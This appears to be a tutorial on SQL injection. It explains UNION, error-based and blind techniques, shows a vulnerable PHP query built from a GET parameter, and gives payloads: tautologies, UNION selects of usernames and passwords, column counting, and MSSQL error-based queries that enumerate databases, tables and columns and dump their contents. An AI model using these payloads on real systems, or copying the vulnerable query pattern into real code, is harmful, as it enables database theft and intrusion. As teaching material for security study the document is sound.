# SQLi Basics

SQL statement structure

```text
> SELECT <column list> FROM <table> WHERE <conditions>

> SELECT name, description FROM products WHERE id=9;
> SELECT 22, 'string', 0x12, 'another string';
```

UNION performs an union between two results:

```text
> <select statement> UNION <second select statement>;
```

If a table contains duplicate rows, use the DISTINCT operator to filter out duplicate entries

```text
> SELECT DISTINCT <field list> <remainder of statement>;
```

UNION statement implies DISTINCT by default.

You can perform UNION with chosen data:

```text
> SELECT Name, Description FROM Products WHERE ID='2' UNION SELECT 'Example', 'Data';
```

Example of union:

```text
> SELECT Name, Description FROM Products WHERE ID='2' UNION SELECT Username, Password FROM Accounts;
```

This query will get the name and description of the item which ID is 3 and all usernames and passwords from the Accounts table

Comments:

```text
> SELECT field FROM table; # this is a comment
> SELECT field FROM table; -- this is another comment
```

Web applications when using databases must:

1. Connect to the database
2. Submit the query to the database
3. Retrieve the results

Example of php connection to MySQL:

```text
$dbhost='1.1.1.1';
$dbuser='username';
$dbpass='password';
$dbname='database';

$connect = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='2' UNION SELECT Username, Password FROM Accounts;";

$results = mysqli_query($connection, $query);
display_results($results);
```

mysqli\_query\(\) is a function which submits the query to the database  
display\_results\(\) function renders the data

The query above is a static query, and most of the time this is not what you find in the real world. Generally you want to query the database based on what the client is trying to do, like searching for a product by its name or ID:

```text
$id = $_GET['id'];

<ommited db variables>

$connect = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='$id';";

$results = mysqli_query($connection, $query);
display_results($results);
```

In this case, you have a query which uses the GET id parameter to build a query. This means the client can manipulate the query and construct it in a way that it returns information the client is not suppose to receive. Let's say the client provide the following information as the id:

```text
' OR 'a'='a
```

the query would become:

```text
> SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
```

Setting up two conditions:

* ID must be empty OR
* an always true condition \(A will always be equal to A\)

Since the second condition will always be fullfilled, this basically means that you can return the Name and Description from the table products whenever A = A, in another words, it will return the entier table.

Is always possible to exploit the UNION command:

```text
' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
```

So the query becomes:

```text
> SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

So you can get informations from tables that are not even being used, in this case, you can basically dump the entire database through an SQLi.

How critical is a SQLi?

1. Depends on the DBMS \(Mysql, SQL server, Oracle DB, etc.\)
2. Some DBMS allows you to run commands in the host machine, so you can get information for a foothold or even a foothold itself \(shell, LFI, host OS information\)

When and Where SQLi can be found?

Generally in input fields where the client can insert data \(injection points\), then manipulate the input in a way you can take control over the dynamic query.

The most common way to do that \(script kiddie shit here\) is to input characters which breaks the SQL query and see if the application returns an error, like an '

Not all inputs are used to build a query, so you need to checkout all the different input parameters and check which is used for database data retrieval.

Input parameters are carried through GET and POST requests.

Beyond trying an ', you can:

* Use " as well
* SELECT, UNION and other sql commands
* Comments, \# or --

How do I know that the I found an SQLi?

When you break the sqli using the characters above, the application may throw out an error, every DMBS responds to incorrect sql queries differently:

MS-SQL:

```text
Incorrect syntax near [query snippet]
```

MySQL:

```text
You have an error in your SQL syntax. Check the manual that corresponds /
to your MySQL server vrsion for the right syntax to use near [query snippet]
```

Finding these errors means is very likely the application is vulnerable. In the real world, most websites does not display such errors, in this case, you need to test using binary/true-false/boolean based queries.

Remember, you generally can't see the query, so you need to wrap your brain around the site and understand the input fields and how the information return relates to it so you can start building how it works.

Adding a second required condition is a way to test that, add to the query

```text
and 'a'='a
```

And see if it still works. Then try to set a second required condition which is not met, like:

```text
and 'a'='b
```

And see if it stops working

What are the types of SQLi attacks?

* In-Band SQLi
* Error-Based SQLi
* Blind SQLi

in-band SQL uses the same channel to inject and receive information, like an webapp page field.

Error-based is when you force the DBMS to output error messages and use that to perform data exfiltration, like via reports or warning e-mails

Blind SQL means the application does not reflect back the reply of you query, this means you can't see the output and needs to rely on true-false / binary conditions and requests, like 'Is the first letter of the user A? If not, waits 3 seconds before replying', and keep asking the database until you can gather enough information.

How to exploit in-band SQLi?

The best way to exploit in-band sqli is with the UNION command. However, there are some important things you need to take in account:

* The field types of the second SELECT must match the ones in the first statemement.
* The number of fields in the second SELECT must match the first statement.
* To successfully perform the attack, we need to understand the structure of the database \(tables and columns\).

To solve the first two issues, lets enumerate the number of columns/fields a query selects:

```text
mysql_query("SELECT id, real_name FROM users WHERE id=".$GET['id'].";");
```

The columns and data types are:

* id has data type int
* real\_name has data type varchar \(string\)

In this case, for the second SELECT statement using UNION, if we select more than 2 columns or if the number is correct but the data type is different it will not work and will try to throw an error:

MySQL:

```text
The used SELECT statement have a different number of columns
```

MS SQL:

```text
All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target list.

```

PostgreSQL:

```text
Each UNION query must have the same number of columns.
```

Oracle:

```text
ORA-01789: query block has incorrect number of result columns.
```

Detecting the number of fields needed to exploit an in-band SQL injection looks like:

```text
> 9999 UNION SELECT NULL; ---
> 9999 UNION SELECT NULL, NULL; ---
> 9999 UNION SELECT NULL, NULL, NULL; ---
> 9999 UNION SELECT NULL, NULL, NULL, NULL; ---

Another example:

> 1111' UNION SELECT NULL; -- -
> 1111' UNION SELECT NULL, NULL; -- -
> 1111' UNION SELECT NULL, NULL, NULL; -- -
> 1111' UNION SELECT NULL, NULL, NULL, NULL; -- -
```

For the query to work, the number of NULL fields must match, so we can just keep adding it until the app doesn't throw an error anymore, as the two statements finally will be balanced \(with the same number of fields in both SELECT statements\).

This can be used even when the application does not throw an error when the query is wrong. Generally it will not display anything or the page will be messed up, so you can keep adding NULL to the query til it works.

Now, to discover the datatype of each field, we can simply repeat the same exercise since most DBMS won't allow UNION based queries if the datatype are different, therefore:

```text
> SELECT 1 UNION 'a';
```

Won't work and will trigger an error.

| DBMS | Datatype enforcing |
| :--- | :--- |
| MySQL | No |
| MSSQL | Yes |
| ORACLE | Yes |
| PostgreSQL | Yes |

Now, we:

* Substitute one of the null fields with a constant.
* If the constant type is correct, the query will work
* If the type is wrong, the webapp will throw an error or misbehave

So after finding the number of fields, we change the datatypes:

```text
> 1111' UNION SELECT NULL, NULL; -- -
#Change first field to int
> 1111' UNION SELECT 1, NULL; -- -
#If no errors, change the second field to int
> 1111' UNION SELECT 1, 1; -- -
#If errors, change the second field to string
> 1111' UNION SELECT 1, 'a'; -- -
```

How to exploit error-based SQLi?

Extracting information using error-based SQLi is really quick and its available in ORACLE, postgreSQL and MSSQL.

Most of the time the error message is not reflected in the webapp output, but it can be embedded in an email message or appended to a log file. We can use error-based SQLi to dump information about the database itself, like database names, schemas and useful data.

Schemas are databases which purpose is to describe all other user-defined databases.

in MSSQL, the name of the database objects are revealed within errors. the user sa is the super admin and has access to the master database. The master database contains schemas of user-defined dbs.

First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that:

```text
99999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
```

* `99999` is a bogus value.
* `or 1 in` is the part of the query that will trigger the error, we are trying to find 1, an integer, within a varchar column.
* `CAST(<FIELDNAME> as varchar(4096))` is where we insert the column that we want to dump (either user-based or special database column). 
* `<FIELDNAME>` can also be a SQL function like `user_name()` or a variable like `@@version`
* `WHERE <FIELDNAME> NOT IN (<LIST>)` this part is used to dump the database and can be ommited or ajusted.

To retrieve the SQL version:

```text
99999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
```
```text
[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) ' to data type int.
```

So, with all this information, how can I dump the entire database?

First of all, we need to discover some stuff:

* Current database username

```text
99999 or 1 in (SELECT TOP 1 CAST(@@user_name as varchar(4096))) --
```

* Current databases and all other databases the user can read

```text
99999 or 1 in (SELECT TOP 1 CAST(@@db_name(0) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(@@db_name(1) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(@@db_name(2) as varchar(4096))) --
```

* The tables into a given database

To enumerate all tables in a database, we can use the following payload:

```text
9999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096)) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --
```
	- `xtype means='U'` means we only want user-defined tables
	- `name NOT IN ('<know table list>')` name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.


* The columns of a given table

After retrieving the tables, we can retrieve the columns using the following payload:

```text
9999 or 1 in (SELECT TOP 1 CAST (<db name>..syscolumns.name as varchar (4096)) FROM <db name>..syscolumns,<db name>..sysobjects WHERE <db name>..syscolumns.id=<db name>..sysobjects.id AND <dbname>. .sysobjects.name=<table name> AND <db name>..syscolumns.name NOT IN (<known column list>)); --
```
	- `<db name>` is the name of database we're working on
	- `<table name>` is the table which we're trying to find the columns
	- `<known column list>` list of columns we already discovered


Finally, to dump the database, we can use the following query:

```text
9999 or 1 in (SELECT TOP 1 CAST (<column name> as varchar (4096) ) FROM <db name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
```